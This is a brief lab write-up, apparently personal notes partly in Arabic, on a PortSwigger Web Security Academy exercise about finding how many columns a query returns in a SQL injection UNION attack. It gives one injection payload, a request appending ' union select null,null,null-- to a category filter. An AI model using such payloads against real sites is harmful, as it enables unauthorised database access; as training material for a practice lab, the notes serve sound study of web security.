# Lab: SQL injection UNION attack, determining the number of columns returned by the query

https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

- الفكره من الLab  ده تحديد عدد الأعمدة التي يتم إرجاعها بواسطة الاستعلام

```bash
1. GET /filter?category=Accessories'union select null,null,null--
```
